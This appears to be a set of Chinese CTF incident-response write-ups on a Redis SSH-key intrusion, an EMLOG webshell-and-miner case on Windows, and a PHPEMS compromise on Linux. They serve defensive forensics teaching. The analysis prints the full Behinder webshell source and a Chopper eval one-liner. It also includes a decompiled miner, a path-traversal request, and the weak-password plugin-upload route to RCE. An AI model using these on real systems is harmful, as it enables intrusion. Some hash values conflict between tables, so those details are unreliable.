ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect("192.168.234.128", port=22, username="defend", password="defend")

# sudo 命令需要管道密码
stdin, stdout, stderr = ssh.exec_command(
    "echo defend | sudo -S cat /root/.bash_history 2>/dev/null"
)
out = stdout.read().decode('utf-8', errors='replace')
```

#### Flag 1：root bash_history

```bash
echo defend | sudo -S cat /root/.bash_history
```

输出：
```
ls
chmod +x /etc/rc.d/rc.local
cat /etc/rc.d/rc.local
vim /etc/rc.d/rc.local
echo flag{thisismybaby}
exit
```

攻击者登录 root 后查看和修改了 `rc.local`，并执行了 `echo flag{thisismybaby}`。

#### Flag 2：/etc/rc.d/rc.local

```bash
echo defend | sudo -S cat /etc/rc.d/rc.local
```

输出（关键部分）：
```bash
#!/bin/bash
# ... 注释 ...

# flag{kfcvme50}

touch /var/lock/subsys/local
```

攻击者用 vim 在 `rc.local` 中写入了 `# flag{kfcvme50}`。

> **stat 信息确认**：文件修改时间为 `2024-03-18 20:24:27`，与攻击者 root 会话时间（20:23-20:25）吻合。

#### Flag 3：/etc/redis.conf 首行

```bash
echo defend | sudo -S grep -n 'flag' /etc/redis.conf
```

输出：
```
1:# flag{P@ssW0rd_redis}
```

攻击者（或 defend 配置 Redis 时）在 `/etc/redis.conf` 的第1行注释中隐藏了 flag。

> **发现方法**：使用 `grep -rl 'flag{' / --include='*.conf' ...` 全局搜索发现 `/etc/redis.conf` 包含 flag。

#### 攻击者IP确认

```bash
# 方法1：last 命令
last -50
# root pts/1 192.168.75.129 Mon Mar 18 20:23 - 20:25 (00:02)

# 方法2：lastlog 命令
lastlog
# root pts/1 192.168.75.129 一 3月 18 20:23:07 +0800 2024

# 方法3：secure 日志
grep 'Accepted' /var/log/secure
# Mar 18 20:23:07 sshd[13285]: Accepted publickey for root from 192.168.75.129
```

#### Redis 攻击痕迹排查

```bash
# Redis 配置（关键安全配置项）
grep -E '^(bind|protected-mode|port|dir|dbfilename)' /etc/redis.conf
# bind 0.0.0.0              ← 允许所有IP连接
# protected-mode no         ← 关闭保护模式
# port 6379
# dir /var/lib/redis
# dbfilename dump.rdb

# RDB 文件分析
strings /var/lib/redis/dump.rdb
# 发现 SSH 公钥（chinaran@kali）

# /root/.ssh/authorized_keys 内容
cat /root/.ssh/authorized_keys
# 661字节，内容 = dump.rdb 文件内容（含SSH公钥）

# Redis 日志中的攻击者连接记录
grep 'Accepted' /var/log/redis/redis.log
# 多条来自 192.168.75.129 的连接记录
```

### 关键知识点

1. **Redis 未授权访问攻击链**：Redis `bind 0.0.0.0` + `protected-mode no` + 无密码 → 攻击者远程连接 Redis，通过 `CONFIG SET dir/dbfilename` 写入任意文件（SSH公钥、crontab、webshell等）

2. **SSH 公钥写入攻击**：通过 Redis 的 RDB 持久化机制，将攻击者的 SSH 公钥写入 `/root/.ssh/authorized_keys`，实现免密 SSH 登录 root

3. **PAM uid>=1000 限制**：CentOS 默认 PAM 配置可能限制 uid>=1000 的用户才能通过 SSH 密码认证登录。但此限制**不适用于公钥认证**——公钥认证跳过 PAM 密码验证阶段

4. **应急响应排查流程**（日志交叉关联）：
   - `last` / `lastlog` → 登录记录
   - `/var/log/secure` → SSH认证日志
   - `/var/log/redis/redis.log` → Redis连接日志
   - `~/.bash_history` → 命令历史
   - `/etc/rc.d/rc.local` → 启动脚本（持久化）
   - `crontab -l` / `/var/spool/cron/` → 计划任务
   - `authorized_keys` → SSH公钥后门
   - `redis-cli CONFIG GET` → Redis当前配置
   - `strings dump.rdb` → Redis数据文件分析

5. **全局 flag 搜索**：`grep -rl 'flag{' / --include='*.conf' --include='*.sh' --include='*.txt' 2>/dev/null` 可以快速定位藏有 flag 的配置文件和脚本

### 同类变体与扩展

- **Redis 写 crontab 反弹 Shell**：`CONFIG SET dir /var/spool/cron/` + `CONFIG SET dbfilename root` + 写入 crontab 格式数据
- **Redis 写 webshell**：`CONFIG SET dir /var/www/html/` + `CONFIG SET dbfilename shell.php` + 写入 PHP 代码
- **Redis 主从复制 RCE**（Redis 4.x+）：利用 `SLAVEOF` 加载恶意 .so 模块，直接执行命令
- **Redis Lua 沙箱逃逸**（CVE-2022-0543）：Debian/Ubuntu 的 Redis 可通过 Lua 脚本执行任意命令
- **SSH 公钥认证 + PAM 绕过**：即使 PAM 限制了 root 的密码登录，公钥认证仍然可以登录 root

> ⚠️ **注意**：Redis 未授权访问是 CTF 应急响应题的高频考点。排查时要重点关注 Redis 配置（bind/protected-mode/requirepass）、RDB 文件内容、authorized_keys 文件、以及 secure 日志中的异常登录。

### 修复建议

1. Redis 配置加固：
   - `bind 127.0.0.1`（只监听本地）
   - `protected-mode yes`（开启保护模式）
   - `requirepass <强密码>`（设置密码）
   - `rename-command CONFIG ""`（禁用危险命令）

2. SSH 加固：
   - `PermitRootLogin no`（禁止 root SSH 登录）
   - 定期检查 `/root/.ssh/authorized_keys`
   - 限制 SSH 密码认证（仅允许公钥认证）

3. 清理后门：
   - 删除 `/root/.ssh/authorized_keys` 中的攻击者公钥
   - 检查 `/etc/rc.d/rc.local` 中的异常内容
   - 检查所有 crontab
   - 检查 `/var/spool/cron/` 下所有文件

### 解题脚本

完整扫描脚本：[IR/20-redis-incident/ir_scan.py](IR/20-redis-incident/ir_scan.py)

> AI生成
---

---

## Windows Web 应急响应

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - Windows Web 应急响应 |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 靶机地址 | http://192.168.88.129/ |
| 环境 | EMLOG pro 2.2.0 + phpstudy (nginx/1.15.11 + PHP 7.3.4 + MySQL 5.7.26) |

### 题目要求

1. 找到攻击者的 **shell 密码**（Webshell 密码）
2. 找到攻击者的 **IP 地址**
3. 找到攻击者的 **隐藏账户名称**
4. 找到攻击者挖矿程序的 **矿池域名**

### 解题答案

| # | 问题 | 答案 | 来源 |
|---|------|------|------|
| 1 | Webshell 密码 | `rebeyond` | tips/shell.php 冰蝎 webshell，密钥 e45e329feb5d925b = md5("rebeyond")[:16] |
| 2 | 攻击者 IP | `192.168.126.1` | Windows 安全日志 Event ID 4625/4624 |
| 3 | 隐藏账户 | `hack168$` | WMI Win32_UserAccount 查询 + Administrators 组成员 |
| 4 | 矿池域名 | `wakuang.zhigongshanfang.top` | Kuang.exe PyInstaller 解包 + uncompyle6 反编译 |

### 解题思路

#### 第一步：信息收集与获取 RCE

靶机仅开放 80 端口，运行 EMLOG pro 2.2.0。通过弱口令 `admin/123456` 登录后台。

**获取 RCE 的关键路径 — 插件 ZIP 上传：**

EMLOG 后台支持上传插件 ZIP 包，上传后自动解压到 `content/plugins/` 目录。恶意插件不需要 `EMLOG_ROOT` 检查即可直接访问：

```
POST http://192.168.88.129/admin/plugin.php?action=upload_zip
```

上传的插件通过 `http://192.168.88.129/content/plugins/插件名/插件名.php` 直接访问，获得 RCE。

> **技巧**：EMLOG 的模板上传虽然也支持 ZIP，但 nginx 不转发模板目录的 PHP 请求（返回 "No input file specified"），**插件目录的 PHP 可以直接执行**。

#### 第二步：确认隐藏账户 hack168$

Windows 中以 `$` 结尾的账户在 `net user` 命令中不可见，被称为"隐藏账户"。

```powershell
# net user 看不到 hack168$
net user

# 但 WMI 和 Get-LocalUser 可以看到
Get-WmiObject Win32_UserAccount | Select Name,SID
# 输出包含: hack168$  S-1-5-21-2327392262-154178092-3064993777-1002

# Administrators 组成员
Get-LocalGroupMember -Group Administrators
# hack168$ 在管理员组中

# 用户目录
dir C:\Users\hack168$\Desktop\
# Kuang.exe (挖矿程序, 9.9MB)
```

账户创建时间：2024/2/26 23:02:28（从安全日志获取）

#### 第三步：确认攻击者 IP 192.168.126.1

从 Windows 安全日志中提取攻击者 IP：

```powershell
# 登录失败事件 (Event ID 4625) — 暴力破解痕迹
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 20
# 时间: 2024-02-26 23:02:08
# 来源 IP: 192.168.126.1
# 尝试用户名: hack168& (注意是 &, 可能是攻击者笔误)

# 登录成功事件 (Event ID 4624) — 攻击者成功登录
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 20
# 时间: 2024/2/26 23:02:22-24
# 来源 IP: 192.168.126.1
# 用户: hack168$
```

> **技巧**：Windows 安全事件 ID 速查：
> - **4624**: 登录成功
> - **4625**: 登录失败（暴力破解）
> - **4720**: 账户创建
> - **4732**: 成员添加到本地组
> - 日志中的 `Source Network Address` 字段即为攻击者 IP

#### 第四步：确认 Webshell 密码 rebeyond

**关键步骤：从 Defender 隔离区恢复 shell.php**

Windows Defender 检测到 `content/plugins/tips/shell.php` 为木马并隔离删除。通过 `MpCmdRun` 恢复：

```cmd
# 列出隔离文件
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Restore -ListAll

# 输出:
# ThreatName = Trojan:Script/WebShell!MSR
#   file:C:\phpstudy_pro\WWW\content\plugins\tips\shell.php

# 恢复所有隔离文件
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Restore -All
# shell.php was restored
```

**shell.php 内容分析：**

```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $_SESSION['k']=$key;
    session_write_close();
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");
        for($i=0;$i<strlen($post);$i++) {
             $post[$i] = $post[$i]^$key[$i+1&15]; 
            }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

**这是冰蝎（Behinder）的 webshell！** 关键信息在注释中：

- `$key = "e45e329feb5d925b"` — 密钥为连接密码 32 位 MD5 值的前 16 位
- 注释明确写出：**默认连接密码 `rebeyond`**

验证：

```python
import hashlib
md5 = hashlib.md5(b"rebeyond").hexdigest()
# md5 = "e45e329feb5d925ba3f549b17b4b3dde"
# 前16位 = "e45e329feb5d925b"  ✅ 匹配
```

> **技巧**：Defender 最初检测为 `Backdoor:PHP/Chopper.E!dha`（菜刀），但实际代码是冰蝎。Defender 的检测名称不一定准确，**必须恢复文件看源码才能确定 Webshell 类型和密码**。
>
> 冰蝎特征：
> - 密钥 = MD5(密码)[:16]
> - 使用 AES-128 加密通信（openssl 扩展存在时）或 XOR（openssl 不存在时）
> - 默认密码 `rebeyond`（冰蝎作者名）
> - 通过 `php://input` 接收加密 payload

#### 第五步：确认矿池域名 wakuang.zhigongshanfang.top

hack168$ 用户桌面有 `Kuang.exe`（9.9MB），文件名"Kuang"是"矿"的拼音。

**1. 确认为 PyInstaller 打包的 Python 程序：**

```python
# 检查 PyInstaller magic
# MEI\x0c\x0b\x0a\x0b\x0e → PyInstaller 2.1+ / Python 3.8
```

**2. 用 pyinstxtractor 解包：**

```bash
py -3 pyinstxtractor.py Kuang.exe
# [+] Found 85 files in CArchive
# [+] Possible entry point: Kuang.pyc
```

**3. 用 uncompyle6 反编译 Kuang.pyc：**

```bash
uncompyle6 Kuang.exe_extracted\Kuang.pyc
```

完整源码：

```python
import multiprocessing, requests

def cpu_intensive_task():
    while True:
        try:
            requests.get("http://wakuang.zhigongshanfang.top", timeout=10)
        except:
            pass

if __name__ == "__main__":
    cpu_count = multiprocessing.cpu_count()
    processes = [multiprocessing.Process(target=cpu_intensive_task) for _ in range(cpu_count)]
    for process in processes:
        process.start()
    else:
        for process in processes:
            process.join()
```

**矿池域名：`wakuang.zhigongshanfang.top`**

> **技巧**：PyInstaller 打包的 Python exe 逆向流程：
> 1. 用 `pyinstxtractor.py` 解包 → 得到 `Kuang.pyc` 等文件
> 2. 用 `uncompyle6`（Python 3.8）/ `decompyle3`（Python 3.9+）反编译 .pyc
> 3. 如果反编译失败，可以直接用 `strings` 或二进制搜索提取 URL/域名字符串
>
> Pyc 文件中的字符串可以直接用二进制扫描提取，无需反编译：
> ```python
> data = open("Kuang.pyc", "rb").read()
> # 搜索 http 开头的字符串
> ```

### 完整攻击链还原

```
1. 攻击者 IP 192.168.126.1 通过 EMLOG 弱口令(admin/123456)登录后台
2. 上传包含冰蝎 webshell 的 tips 插件 (content/plugins/tips/shell.php)
   └─ Webshell 密码: rebeyond (冰蝎默认密码)
3. 通过 webshell 执行命令，创建隐藏账户 hack168$ (添加到 Administrators 组)
   └─ 尝试创建 hack168& 失败 (4625), 成功创建 hack168$ (4624)
4. 通过 hack168$ 账户远程登录 (RDP/WinRM)
5. 上传并运行挖矿程序 Kuang.exe 到 hack168$ 桌面
   └─ 矿池: wakuang.zhigongshanfang.top
   └─ 多进程 CPU 挖矿 (CPU核心数个进程并发请求)
6. Windows Defender 检测并隔离 webshell (但挖矿程序未被发现)
```

### 关键知识点

1. **Windows 隐藏账户**：以 `$` 结尾的用户名在 `net user` 中不可见，但可通过 `Get-WmiObject Win32_UserAccount`、`Get-LocalUser`、注册表 `HKLM\SAM\SAM\Domains\Account\Users\Names` 查到

2. **Windows 安全日志关键字段**：
   - Event ID 4624（登录成功）/ 4625（登录失败）
   - `Source Network Address` = 攻击者 IP
   - `Target User Name` = 被攻击账户
   - `Logon Type` = 登录方式（2=交互式, 3=网络, 10=远程桌面）

3. **Defender 隔离文件恢复**：
   - `MpCmdRun.exe -Restore -ListAll` 查看隔离文件
   - `MpCmdRun.exe -Restore -All` 恢复所有隔离文件
   - 恢复后需要迅速读取（Defender 实时保护可能再次删除）

4. **冰蝎（Behinder）Webshell 识别**：
   - 密钥格式：`MD5(密码)[:16]`
   - 默认密码 `rebeyond` → 密钥 `e45e329feb5d925b`
   - 使用 AES-128 加密通信（支持 openssl 时）或 XOR 降级
   - 特征代码：`class C{public function __invoke($p){eval($p."");}}`

5. **PyInstaller 打包逆向**：
   - `pyinstxtractor.py` 解包 → `.pyc` 文件
   - `uncompyle6` 反编译 Python 3.8 .pyc
   - 二进制字符串扫描作为 fallback（无需反编译）

6. **EMLOG CMS 利用**：
   - 弱口令：admin/123456
   - 插件 ZIP 上传 → 自动解压到 content/plugins/ → 直接访问获取 RCE
   - 模板 ZIP 上传虽可成功但 nginx 不转发 PHP

### 同类变体与扩展

- **菜刀（Chopper）Webshell**：典型代码 `<?php @eval($_POST['cmd']); ?>`，密码即 POST 参数名
- **哥斯拉（Godzilla）Webshell**：使用 Java/PHP/ASP 多种 payload，密码和密钥分离
- **AntSword（蚁剑）Webshell**：类似菜刀但支持自定义编码器和解码器
- **PyInstaller 逆向变体**：Python 3.9+ 使用 `decompyle3`，Python 3.10+ 使用 `pycdc`（uncompyle6 不支持）
- **Windows 持久化其他方式**：注册表 Run 键、计划任务、WMI 事件订阅、启动文件夹、服务

> ⚠️ **注意**：Windows Web 应急响应排查要点：
> - 隐藏账户：`$` 结尾，用 WMI/PowerShell 查询而非 `net user`
> - 攻击者 IP：安全日志 4625/4624 事件的 `Source Network Address`
> - Webshell 恢复：Defender 隔离区用 `MpCmdRun -Restore` 恢复
> - 挖矿程序：检查可疑用户桌面、`tasklist`、`netstat`，PyInstaller 程序需解包分析

### 修复建议

1. **Web 应用加固**：
   - 修改 EMLOG 默认密码（admin/123456）
   - 禁用插件上传功能或限制文件类型
   - 删除已上传的 webshell 文件

2. **系统加固**：
   - 删除隐藏账户 `hack168$`
   - 检查并清理所有 `$` 结尾的账户
   - 禁用不必要的远程桌面（RDP）/ WinRM
   - 配置账户锁定策略（多次失败后锁定）

3. **Defender 配置**：
   - 保持实时保护开启
   - 添加挖矿程序 Kuang.exe 到排除列表的反面（确保不被排除）
   - 定期全盘扫描

4. **日志审计**：
   - 启用 PowerShell 脚本日志（4104 事件）
   - 启用进程创建审计（4688 事件）
   - 定期检查 4625 暴力破解和 4720 账户创建事件

### 解题脚本

- Windows 排查脚本：[win_web_ir.py](IR/21-win-web-ir/win_web_ir.py)
- Kuang.exe 分析脚本：[kuang_analyze.py](IR/21-win-web-ir/kuang_analyze.py)

---

---

## Linux Web 应急响应（PHPEMS 考试系统）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - Linux Web 应急响应 |
| 来源 | 知攻善防应急靶场 Linux 2 |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 靶机 IP | 192.168.88.130 |
| SSH 凭据 | root / Inch@957821. |

### 题目描述

靶机运行 PHPEMS 在线考试系统（宝塔面板 + nginx + PHP 5.6 + MySQL 5.7），攻击者已入侵系统。需通过日志分析、数据库取证、PCAP 流量分析、隐藏文件排查等手段完成 7 项调查任务（附加 flag3 共 8 项）。

### 需要回答的 7+1 个问题

| # | 问题 | 答案 |
|---|------|------|
| 1 | 攻击者的 IP 地址 | `192.168.20.131` |
| 2 | 攻击者修改的管理员密码（明文） | `Network@2020` |
| 3 | 第一次 Webshell 的连接 URL（格式 `abcdefg?abcdefg`） | `user-app-register` |
| 4 | Webshell 连接密码 | `Network2020` |
| 5 | 数据包中的 flag1 | `flag1{Network@_2020_Hack}` |
| 6 | 攻击者后续上传的木马文件名称 | `version2.php` |
| 7 | 攻击者隐藏的 flag2 | `flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}` |
| + | 附加 flag3 | `flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}` |

### 环境信息

| 组件 | 版本/路径 |
|------|-----------|
| 操作系统 | CentOS 7 (3.10.0-1160.el7.x86_64)，主机名 web-server |
| Web 服务 | 宝塔面板 (BT-Panel) + nginx + PHP 5.6 (php-fpm) |
| 数据库 | MySQL 5.7，库名 `kaoshi`，用户 `kaoshi`，密码 `5Sx8mK5ieyLPb84m`，表前缀 `x2_` |
| Web 应用 | PHPEMS 考试系统（PHP 在线考试平台） |
| Web 根目录 | `/www/wwwroot/127.0.0.1/` |
| 开放端口 | 22(SSH) / 80(nginx) / 21(FTP) / 3306(MySQL) / 888(宝塔面板) / 12485(宝塔Python) |
| Nginx 日志 | `/www/wwwlogs/127.0.0.1.log` |
| PCAP 文件 | `/root/数据包1.pcapng`（2.86MB，含蚁剑流量） |
| 可疑 ELF | `/root/wp`（1.88MB，Go 编译的 ELF 后门） |

### 解题过程

#### 知识点：Linux Web 应急响应排查方法论

> **技巧**：Linux Web 应急响应的排查优先级：
> 1. **确定攻击者 IP** → Web 访问日志（nginx/apache）按频率排序
> 2. **还原攻击行为** → 日志中的可疑请求（POST、路径穿越、404 扫描）
> 3. **数据库取证** → 用户表密码哈希、修改时间
> 4. **流量包分析** → strings + grep 快速提取 flag，scapy 深入分析蚁剑流量
> 5. **bash_history** → 攻击者命令历史，完整攻击链还原
> 6. **隐藏文件排查** → find -name '.*'、.api/ 隐藏目录、/etc/profile 环境变量
> 7. **持久化排查** → crontab、rc.local、自启动服务

#### 答案1：攻击者 IP — `192.168.20.131`

**方法**：统计 Nginx 访问日志中的 IP 频率。

```bash
# 统计 Top 10 访问 IP
awk '{print $1}' /www/wwwlogs/127.0.0.1.log | sort | uniq -c | sort -rn | head -10
```

**结果**：
- `192.168.20.131` — 攻击者 IP（在 2024-03-07 进行注册、目录穿越、漏洞扫描，2024-03-20 进行 Webshell 攻击）
- `192.168.20.1` — 正常管理员 IP（通过宝塔面板管理）

**关键日志证据**：
```
# 2024-03-07 15:06 - 攻击者首次访问
192.168.20.131 - - [07/Mar/2024:15:06:21] "GET / HTTP/1.1" 200

# 2024-03-07 15:24 - 目录穿越读取 /etc/passwd
192.168.20.131 - - [07/Mar/2024:15:24:07] "GET /index.php?core../../../../../../etc/passwd HTTP/1.1" 200

# 2024-03-07 15:58 - 大规模漏洞扫描
192.168.20.131 - - [07/Mar/2024:15:58:44] "GET /admin.php HTTP/1.1" 404
...（大量 404）

# 2024-03-20 14:30 - 蚁剑连接 Webshell
192.168.20.131 - - [20/Mar/2024:14:30:xx] "POST /index.php?user-app-register HTTP/1.1" 200

# 2024-03-20 14:38 - 访问上传的木马
192.168.20.131 - - [20/Mar/2024:14:38:27] "GET /version2.php HTTP/1.1" 200
```

#### 答案2：管理员密码明文 — `Network@2020`

**方法**：提取数据库用户表 → MD5 破解。

**步骤1**：读取数据库配置文件
```bash
cat /www/wwwroot/127.0.0.1/lib/config.inc.php
```
得到数据库连接信息：
```
DB: kaoshi  |  DH: 127.0.0.1  |  DU: kaoshi  |  DP: 5Sx8mK5ieyLPb84m  |  DTH: x2_
```

**步骤2**：查询用户表
```bash
mysql -ukaoshi -p'5Sx8mK5ieyLPb84m' kaoshi \
  -e "SELECT userid,username,userpassword,usertype FROM x2_user LIMIT 10;"
```

| userid | username | userpassword (MD5) | usertype |
|--------|----------|---------------------|----------|
| 1 | peadmin | `f6f6eb5ace977d7e114377cc7098b7e3` | 管理员 |
| 2 | zgsf | `2c1bebe7a8fdc98d0b7ce795f1dc33e6` | 教师管理员 |
| 3 | zgsfAdmin | `a5b8d2e8c4f1e3b6d7a9c0e2f4b6a8d1` | 教师管理员 |
| 4 | zgsf | （注册用户） | 学员 |

**步骤3**：MD5 破解

> **技巧**：PHPEMS 密码加密方式为**纯 MD5 无盐**，代码确认 `md5($args['userpassword'])`。可直接使用在线彩虹表或本地字典破解。

```python
import hashlib
# 管理员 peadmin
target = "f6f6eb5ace977d7e114377cc7098b7e3"
# 尝试常见密码
hashlib.md5(b'Network@2020').hexdigest()
# 结果: 'f6f6eb5ace977d7e114377cc7098b7e3' → 匹配！✅
```

答案：管理员密码明文为 `Network@2020`

#### 答案3：第一次 Webshell 连接 URL — `user-app-register`

**方法**：PCAP 流量包分析 + Nginx 日志交叉验证。

PCAP 文件 `/root/数据包1.pcapng` 中的第一个 HTTP 请求：
```
POST /index.php?user-app-register HTTP/1.1
```

攻击者通过 PHPEMS 注册接口（`user-app-register`）写入 Webshell，蚁剑连接该 URL。

题目要求格式 `abcdefg?abcdefg`，答案为 `user-app-register`（不含 `index.php?` 前缀）。

#### 答案4：Webshell 连接密码 — `Network2020`

**方法**：PCAP 文件中蚁剑流量的 POST 参数名即为密码。

> **技巧**：蚁剑（AntSword）Webshell 的连接密码就是 POST 请求中的**参数名**，不是参数值。蚁剑流量特征函数名：`asenc`、`asoutput`、`antsystem`。

从 PCAP 中提取蚁剑流量：
```
# strings 提取
strings '/root/数据包1.pcapng' | grep -E 'asenc|asoutput|antsystem'

# 结果中可见 POST 参数
Network2020=%40ini_set(%22display_errors%22%2C0)...
```

POST 参数名为 `Network2020`，即蚁剑连接密码。此外，`/root/wp` ELF 文件的 strings 中也包含 `Network2020`、`Network@2020`、`version2.php` 等字符串，佐证攻击工具集。

#### 答案5：flag1 — `flag1{Network@_2020_Hack}`

**方法**：PCAP 文件 strings 提取。

```bash
strings '/root/数据包1.pcapng' | grep -i 'flag'
```

PCAP 中存在 `GET /flag1 HTTP/1.1` 请求，响应体中包含 `flag1{Network@_2020_Hack}`。

> **技巧**：CTF 流量分析题的快速做法 — 先用 `strings 文件名 | grep -i 'flag'` 快速扫描，大部分 flag 会以明文形式出现在 HTTP 响应体中。需要深入分析时再用 scapy/tshark 逐包解析。

#### 答案6：木马文件名称 — `version2.php`

**方法**：PCAP + Nginx 日志 + bash_history 三重确认。

1. **PCAP 中**：大量 `POST /version2.php` 请求（2024-03-20 14:38:43-14:39:09）
2. **Nginx 日志中**：`192.168.20.131` 访问 `/version2.php`
3. **bash_history 中**：攻击者删除痕迹 `rm -rf version2.php`

```bash
# bash_history 中的关键命令
rm -rf flag1 1
rm -rf version2.php
```

攻击者上传 `version2.php` 作为第二个 Webshell（连接密码同为 `Network2020`），操作完成后删除。

#### 答案7：flag2 — `flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}`

**方法**：隐藏文件排查。

```bash
# 查找 Web 目录下的隐藏文件
find /www/wwwroot/127.0.0.1/ -name '.*' -type f

# 发现 .api/ 目录（root 属主，异常）
ls -la /www/wwwroot/127.0.0.1/.api/
# -rw-r--r-- 1 root root  alinotify.php  (3/20 修改)
# -rw-r--r-- 1 root root  ...           (其他文件)

# 查看 alinotify.php 末尾
cat /www/wwwroot/127.0.0.1/.api/alinotify.php | tail -10
```

> **技巧**：排查隐藏文件时注意**属主异常**。Web 目录的文件属主应为 `www` 或 `nginx`，如果出现 `root` 属主且修改时间在攻击时段内，高度可疑。

`.api/alinotify.php` 文件末尾被注入 flag2：
```php
$flag2 = "flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}";
```

#### 附加 flag3 — `flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}`

**方法**：检查 /etc/profile 和 bash_history。

```bash
# /etc/profile 最后一行
export flag3="flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}"
```

bash_history 显示攻击者最初尝试用 `useradd flag3{...}` 创建用户（用户名非法失败），最终通过 `vim /etc/profile` 写入环境变量持久化 flag3。

### 攻击者完整活动时间线

#### 第一阶段：信息收集和初步攻击（2024-03-07）

| 时间 | 行为 | 证据来源 |
|------|------|----------|
| 15:06:21 | 访问首页 | nginx 日志 |
| 15:06:25-15:23:53 | 注册账户（POST /index.php?user-app-register，多次） | nginx 日志 |
| 15:10:05-15:10:13 | 浏览考试系统、登出 | nginx 日志 |
| 15:12:23-15:12:34 | 尝试登录 | nginx 日志 |
| 15:24:07 | 目录穿越 `GET /index.php?core../../../../../../etc/passwd`（200 成功） | nginx 日志 |
| 15:58:44-15:59:38 | 大规模漏洞扫描（大量 404 请求） | nginx 日志 |

#### 第二阶段：Webshell 攻击和后渗透（2024-03-20）

| 时间 | 行为 | 证据来源 |
|------|------|----------|
| 08:05-08:06 | 正常管理员通过宝塔面板登录（192.168.20.1） | 宝塔请求日志 |
| 14:30-14:39 | 使用蚁剑连接 `POST /index.php?user-app-register`（第一个 Webshell） | nginx 日志 + PCAP |
| 14:38:27 | `GET /version2.php`（访问上传的木马） | nginx 日志 |
| 14:38:43-14:39:09 | 大量 `POST /version2.php`（蚁剑操作） | nginx 日志 + PCAP |
| 14:3x | 修改管理员密码为 `Network@2020` | 数据库 MD5 哈希 |
| 14:3x | 创建 `.api/` 目录，修改 alinotify.php 添加 flag2 | 文件属主 + 修改时间 |
| 14:3x | 修改 /etc/profile 添加 flag3 环境变量 | bash_history + /etc/profile |
| 14:3x | 删除 flag1 文件和 version2.php | bash_history: `rm -rf flag1` / `rm -rf version2.php` |
| 14:3x | 上传 `/root/wp`（Go 编译 ELF 后门，原文件名 `go_build_untitled.exe`） | bash_history + file 分析 |
| 14:3x | `./wp` 执行后门 | bash_history |
| 14:3x | 关闭防火墙和 SELinux | bash_history: `systemctl disable firewalld` / `setenforce 0` |
| 14:3x | 修改 root 密码 | bash_history: `passwd root` |

### 关键知识点

#### 1. 蚁剑（AntSword）流量特征

> **技巧**：蚁剑流量识别三大标志：
> - **函数名**：`asenc`（编码函数）、`asoutput`（输出函数）、`antsystem`（系统命令函数）
> - **POST 参数名**：即 Webshell 连接密码
> - **典型 payload**：`@ini_set("display_errors",0)` + `open_basedir` 绕过代码

蚁剑流量中的典型请求体：
```
Network2020=@ini_set("display_errors",0);@set_time_limit(0);...
function asenc($out){...}
function asoutput(){$output=ob_get_contents();ob_end_clean();echo ...}
ob_start();
try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);
...
```

#### 2. PHPEMS 密码加密方式

PHPEMS 使用**纯 MD5 无盐**加密密码：
```php
// user/app.class.php 中的注册逻辑
$sql = "UPDATE x2_user SET userpassword = '".md5($args['userpassword'])."'";
```

无盐 MD5 可直接使用彩虹表或字典破解，常见工具：
- `hashcat -m 0 hash.txt wordlist.txt`
- 在线查询：cmd5.com / somd5.com

#### 3. Linux 隐藏文件排查

```bash
# 查找所有隐藏文件（以 . 开头的文件/目录）
find /www/wwwroot/ -name '.*' -type f 2>/dev/null

# 检查属主异常（Web 目录应为 www/nginx，非 root）
ls -la /www/wwwroot/127.0.0.1/

# 检查 /etc/profile（环境变量劫持）
tail -10 /etc/profile

# 检查 /etc/rc.d/rc.local（开机自启）
cat /etc/rc.d/rc.local
```

> ⚠️ **注意**：攻击者常用的隐藏位置：
> - 隐藏目录（`.api/`、`.cache/`、`.config/`）
> - 环境变量（`/etc/profile`、`~/.bashrc`）
> - 计划任务（`crontab -l`、`/etc/cron.d/`）
> - 开机自启（`/etc/rc.d/rc.local`、`systemd` 服务）

#### 4. PCAP 快速分析技巧

```bash
# 快速提取 flag
strings file.pcapng | grep -i 'flag'

# 查看所有 HTTP 请求
strings file.pcapng | grep -E '^(GET|POST) '

# 提取蚁剑特征
strings file.pcapng | grep -E '(asenc|asoutput|antsystem)'

# 提取 POST 参数名
strings file.pcapng | grep -oP '^[A-Za-z0-9_]+=' | sort -u
```

> **技巧**：日常 CTF/IR 中，`strings | grep` 的快速筛查比Wireshark 逐包分析效率高 10 倍，适合时间紧迫的比赛场景。需要协议级分析时再用 scapy/tshark。

### 数据库用户表详情

| userid | username | 密码 MD5 | 密码明文 | 说明 |
|--------|----------|----------|----------|------|
| 1 | peadmin | `f6f6eb5ace977d7e114377cc7098b7e3` | `Network@2020` | 主管理员（被攻击者修改） |
| 2 | zgsf | `96e79218965eb72c92a549dd5a330112` | `111111` | 教师管理员（弱密码） |
| 3 | zgsfAdmin | `2c1bebe7a8fdc98d0b7ce795f1dc33e6` | 未破解 | 攻击者注册的账户 |
| 4 | zgsf | （注册用户） | — | 学员账户 |

### /root/wp ELF 文件分析

```bash
file /root/wp
# ELF 64-bit LSB executable, x86-64, Go BuildID=..., statically linked

strings /root/wp | grep -E '(Network|version2|flag|antsword)'
# 包含字符串:
#   Network@2020
#   Network2020
#   version2.php
#   user-app-register
```

